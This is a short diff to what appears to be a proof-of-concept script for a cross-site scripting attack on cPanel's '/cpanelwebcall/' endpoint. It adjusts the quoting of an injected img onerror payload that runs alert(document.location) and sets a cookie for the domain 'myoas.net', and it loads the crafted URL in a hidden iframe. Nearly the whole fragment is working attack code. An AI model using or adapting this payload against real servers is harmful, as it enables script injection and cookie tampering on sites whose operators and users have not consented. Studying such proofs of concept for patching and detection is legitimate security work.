@@ -35,7 +35,7 @@
       alert(`Image loaded successfully: ${imageUrl}`);
       let origHost = new URL(imageUrl).host;
       let randomString = generateRandomString();
-      let newUrl = `http://${origHost}/cpanelwebcall/<img%20src=x%20onerror=alert(document.location);document.cookie='testing=<script>;domain=myoas.net'>`;
+      let newUrl = `http://${origHost}/cpanelwebcall/<img%20src=x%20onerror="alert(document.location);document.cookie='testing=<script>;domain=myoas.net'">`;
       // Create an iframe and load the URL
       let iframe = document.createElement('iframe');
       iframe.src = newUrl;
